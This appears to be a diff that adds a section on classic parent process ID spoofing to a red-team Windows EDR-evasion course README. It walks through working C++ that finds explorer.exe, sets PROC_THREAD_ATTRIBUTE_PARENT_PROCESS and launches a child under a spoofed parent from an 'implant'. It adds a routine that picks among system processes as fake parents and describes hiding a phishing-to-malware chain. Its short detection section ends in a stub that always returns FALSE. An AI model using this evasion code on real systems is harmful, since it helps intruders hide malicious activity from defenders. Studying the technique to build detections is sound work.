@@ -3362,3 +3362,395 @@ compile.bat
 
 
 </details>
+
+
+
+<details>
+
+<summary>10 - Classic PPID Spoofing</summary>
+
+[02.Non-admin/05.PPID-spoof/01.classic](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/05.PPID-spoof/01.classic)
+
+## Overview
+
+Parent Process ID (PPID) spoofing is a technique that changes the parent of a new process to break detectable parent-child relationships. This method is crucial for evading EDR detection that relies on analyzing process lineage and execution chains.
+
+## The Problem: Detectable Process Lineage
+
+### Why Parent-Child Relationships Matter
+
+EDR systems analyze process trees to detect suspicious behavior:
+
+**Common Detection Scenarios:**
+- Excel spawning PowerShell or cmd.exe
+- Browser processes launching scripting engines  
+- Office applications executing unusual child processes
+- Unexpected process chains that indicate code execution
+
+**Real-World Example:**
+```
+Phishing Attack Detection:
+Excel.exe → PowerShell.exe → Malicious Activity
+                    ^
+               EDR flags this chain
+```
+
+### Legitimate Use Cases - The Windows UAC Example
+
+PPID spoofing isn't just for malware - Windows itself uses this technique legitimately through the UAC mechanism:
+
+#### Step 1: Understanding UAC's PPID Spoofing
+
+**Open Process Hacker and navigate to the Services tab:**
+
+1. **Find Application Information Service:**
+   - Scroll through the services list
+   - Locate "Application Information" service
+   - Right-click and select "Go to Process"
+  
+    <img width="1173" height="746" alt="image" src="https://github.com/user-attachments/assets/20283e6e-e5a7-4f4f-9b78-d891cc5b9200" />
+
+2. **Observe the Service Host Process:**
+   - The service runs within a `svchost.exe` process
+   - Note the Process ID (PID) of this svchost instance
+   - This is the Windows component that facilitates UAC elevation
+  
+   <img width="1171" height="744" alt="image" src="https://github.com/user-attachments/assets/51582677-2014-4a62-bb65-045aed230d84" />
+
+**Service Description:**
+```
+Application Information Service (AppInfo)
+- Facilitates the running of interactive applications with additional administrative privileges
+- If stopped, users cannot launch applications with elevated privileges
+- This service is essential for UAC functionality
+```
+
+#### Step 2: Demonstrating UAC PPID Spoofing in Action
+
+**Witness Legitimate PPID Spoofing:**
+
+1. **Launch Notepad as Administrator:**
+   - Right-click Notepad in Start Menu/Taskbar
+   - Select "Run as administrator"
+   - Observe the UAC consent dialog
+
+2. **Analyze the Process Tree in Process Hacker During UAC Prompt:**
+   ```
+   Process Tree During UAC Consent:
+   svchost.exe (AppInfo service, PID: 1234) 
+   └── consent.exe (UAC dialog, PID: 5678)
+   ```
+
+   <img width="976" height="204" alt="image" src="https://github.com/user-attachments/assets/46d8ba0a-2afc-4e8e-8317-de37fa469e79" />
+
+
+3. **After Accepting UAC - The Critical PPID Spoofing Reveal:**
+   ```
+   Final Process Tree After UAC Acceptance:
+   explorer.exe (PID: 789)
+   └── notepad.exe (PID: 9999, elevated)
+   ```
+   
+   <img width="967" height="281" alt="image" src="https://github.com/user-attachments/assets/bd5082c7-938e-456c-a017-2aac2c5e9c04" />
+
+**What Actually Happens Behind the Scenes (Instructor's Explanation):**
+
+> "But the notepad is actually a child of Explorer. And this is possible because svchost is spoofing the parent ID of Notepad, pointing it to the Explorer, which was actually the original caller for spawning the notepad. Because I was running launching Notepad from Taskbar."
+
+**The Complete UAC PPID Spoofing Process:**
+1. **User Action**: You right-click Notepad in Taskbar and select "Run as administrator"
+2. **Original Caller**: `explorer.exe` (PID: 789) is the original process that initiated the request
+3. **UAC Interception**: Windows intercepts and the AppInfo service (`svchost.exe`, PID: 1234) takes over
+4. **Consent Dialog**: AppInfo creates `consent.exe` (PID: 5678) to show UAC prompt
+5. **PPID Spoofing Magic**: When user clicks "Yes", AppInfo creates the elevated Notepad but **spoofs the parent PID** to point back to Explorer (PID: 789) instead of itself
+6. **Final Result**: Notepad appears as a direct child of Explorer, completely hiding the AppInfo service's involvement
+
+**Key Insight from the Instructor:**
+The AppInfo service (svchost) performs the actual PPID spoofing to maintain the illusion that Explorer directly launched the elevated process, creating a seamless user experience while handling privilege elevation transparently in the background.
+
+## Technical Implementation
+
+### Step 3: Implementing PPID Spoofing Programmatically
+
+Now let's implement the same technique that Windows UAC uses, but for our own purposes.
+
+#### Compile and Run the Demonstration
+
+```batch
+cd 01.Classic
+compile.bat
+implant.exe
+```
+
+#### Code Walkthrough
+
+**Main Function Structure:**
+```cpp
+int main(void) {  
+    STARTUPINFOEX info = { sizeof(info) };
+    PROCESS_INFORMATION processInfo;
+    SIZE_T cbAttributeListSize = 0;
+    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
+    HANDLE hParentProcess = NULL;
+    DWORD dwPid = 0;
+```
+
+#### Step 3.1: Finding the Target Parent Process
+
+```cpp
+// Find explorer.exe process ID (mimicking UAC behavior)
+// We target explorer.exe because it's the most common legitimate parent
+dwPid = GetPidByName("explorer.exe");
+if (dwPid == 0)
+    dwPid = GetCurrentProcessId();  // Fallback to current process
+
+printf("implant ID: %d | explorer ID: %d\n", GetCurrentProcessId(), dwPid);
+```
+
+**GetPidByName Function:**
+```cpp
+DWORD GetPidByName(const char * pName) {
+    PROCESSENTRY32 pEntry;
+    HANDLE snapshot;
+
+    pEntry.dwSize = sizeof(PROCESSENTRY32);
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (Process32First(snapshot, &pEntry) == TRUE) {
+        while (Process32Next(snapshot, &pEntry) == TRUE) {
+            if (_stricmp(pEntry.szExeFile, pName) == 0) {
+                return pEntry.th32ProcessID;
+            }
+        }
+    }
+    CloseHandle(snapshot);
+    return 0;
+}
+```
+
+#### Step 3.2: Creating the Attribute List
+
+```cpp
+// Determine required size for attribute list
+// First call with NULL returns required size in cbAttributeListSize
+InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
+
+// Allocate memory for the attribute list using the determined size
+pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(
+    GetProcessHeap(), 
+    0, 
+    cbAttributeListSize
+);
+
+// Initialize the attribute list with correct size
+InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);
+```
+
+#### Step 3.3: Setting the Parent Process Attribute
+
+```cpp
+// Open handle to the target parent process (explorer.exe)
+hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+
+// Update attribute list with parent process information
+// This is where the PPID spoofing magic happens
+UpdateProcThreadAttribute(pAttributeList,
+                        0,
+                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                        &hParentProcess,
+                        sizeof(HANDLE),
+                        NULL,
+                        NULL);
+```
+
+#### Step 3.4: Creating the Process with Spoofed Parent
+
+```cpp
+// Assign the attribute list to startup info
+info.lpAttributeList = pAttributeList;
+
+// Create process with extended startup info
+// The EXTENDED_STARTUPINFO_PRESENT flag is crucial - it tells
+// CreateProcess to use our attribute list for PPID spoofing
+CreateProcessA(NULL,
+                (LPSTR) "notepad.exe",
+                NULL,
+                NULL,
+                FALSE,
+                EXTENDED_STARTUPINFO_PRESENT,  // Critical flag for PPID spoofing
+                NULL,
+                NULL,
+                &info.StartupInfo,
+                &processInfo);
+```
+
+#### Step 3.5: Verification and Cleanup
+
+```cpp
+printf("implant ID: %d | explorer ID: %d | notepad ID: %d\n", 
+       GetCurrentProcessId(), dwPid, processInfo.dwProcessId);
+
+// Short delay to observe the relationship in Process Hacker
+Sleep(30000);
+
+// Cleanup resources
+DeleteProcThreadAttributeList(pAttributeList);
+CloseHandle(hParentProcess);
+```
+
+## Practical Demonstration
+
+### Step 4: Observing the Spoofed Process Tree
+
+#### Before PPID Spoofing (What EDRs Would Detect):
+```
+Process Tree (Detectable):
+implant.exe (PID: 1234) - malicious process
+└── notepad.exe (PID: 5678) - suspicious child process
+```
+
+#### After PPID Spoofing (What EDRs See):
+```
+Process Tree (Appears Legitimate):
+explorer.exe (PID: 789) - legitimate Windows process
+└── notepad.exe (PID: 5678) - appears as normal child
+
+implant.exe (PID: 1234) - no visible relationship to notepad
+```
+
+#### Verification with Process Hacker
+
+1. **Run the `implant.exe`**
+2. **Open Process Hacker**
+3. **Locate the new notepad process**
+4. **Right-click → Properties → General tab**
+5. **Check Parent Process field**: Should show explorer.exe, not implant.exe
+6. **Verify Process IDs**: Match the IDs printed by the implant
+
+   <img width="1445" height="627" alt="image" src="https://github.com/user-attachments/assets/06b14ef7-13cd-45ba-8218-8a6defba7077" />
+
+We can see that notepad is actually a child of explorer and not the `implant.exe` itself. There is no relationship between like parent child relationship between `implant.exe` and notepad. This is a classic method for parent process ID spoofing.
+
+### Step 5: Real-World Attack Scenario
+
+**Without PPID Spoofing (Easily Detected):**
+```
+Phishing Email → Excel.exe (malicious document)
+└── powershell.exe (suspicious child)
+    └── malware.exe (clearly malicious chain)
+```
+
+**With PPID Spoofing (Evades Detection):**
+```
+Phishing Email → Excel.exe (malicious document) - creates processes but...
+explorer.exe (spoofed parent)
+└── powershell.exe (appears legitimate)
+    └── malware.exe (chain appears normal)
+```
+
+## Advanced Techniques
+
+### Step 6: Dynamic Parent Selection
+
+```cpp
+// Array of potential parent processes (priority order)
+// Choose processes that are common and have legitimate reasons to spawn children
+const char* potentialParents[] = {
+    "explorer.exe",    // Windows shell - most common and legitimate
+    "svchost.exe",     // Service host - used by UAC itself
+    "winlogon.exe",    // Windows logon process
+    "csrss.exe",       // Client Server Runtime Subsystem
+    NULL
+};
+
+// Try each potential parent until one works
+DWORD FindSuitableParent() {
+    for (int i = 0; potentialParents[i] != NULL; i++) {
+        DWORD pid = GetPidByName(potentialParents[i]);
+        if (pid != 0 && pid != GetCurrentProcessId()) {
+            printf("Using parent: %s (PID: %d)\n", potentialParents[i], pid);
+            return pid;
+        }
+    }
+    printf("No suitable parent found, using current process\n");
+    return GetCurrentProcessId();  // Fallback
+}
+```
+
+### Step 7: Security Considerations
+
+#### Handle Privileges and Security
+
+```cpp
+// Open parent process with minimal required privileges
+// This reduces detection risk and follows principle of least privilege
+hParentProcess = OpenProcess(
+    PROCESS_CREATE_PROCESS,  // Only need process creation rights
+    FALSE, 
+    dwPid
+);
+
+if (hParentProcess == NULL) {
+    // If we fail, try with more privileges but this is more detectable
+    hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+    
+    if (hParentProcess == NULL) {
+        DWORD error = GetLastError();
+        printf("OpenProcess failed: %d\n", error);
+        return -1;
+    }
+}
+```
+
+## Detection and Mitigation
+
+### How EDRs Can Detect PPID Spoofing
+
+#### Behavioral Analysis
+- Processes spawning children that don't match their typical behavior
+- Explorer.exe spawning PowerShell, cmd, or other unusual children
+- Timing mismatches between process creation and user activity
+
+#### Technical Detection Methods
+
+**EDRs can check for:**
+- `EXTENDED_STARTUPINFO_PRESENT` flag in process creation calls
+- `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` attribute usage
+- Parent-child token and security context mismatches
+- Process creation from services or non-interactive sessions
+
+### Defensive Strategies
+
+#### For Blue Teams
+```cpp
+// Example detection logic
+BOOL DetectPpidSpoofing(DWORD childPid, DWORD claimedParentPid) {
+    // Check if the claimed parent actually has a UI session
+    // Verify the parent process typically spawns such children
+    // Analyze creation timestamps for anomalies
+    // Check token privileges mismatch
+    return FALSE; // Implementation varies
+}
+```
+
+## Building the Project
+
+### Prerequisites
+- Visual Studio 2019 or later
+- Windows SDK
+- C++ development tools
+
+### Compilation
+```batch
+cd 10.ClassicPPIDSpoofing
+compile.bat
+```
+
+## References
+
+- Microsoft Documentation: Process Creation Attributes
+- Windows Internals, 7th Edition - UAC Implementation Details
+- MITRE ATT&CK: T1134 (Parent PID Spoofing)
+- EDR Bypass Research Papers
+- 
+</details>
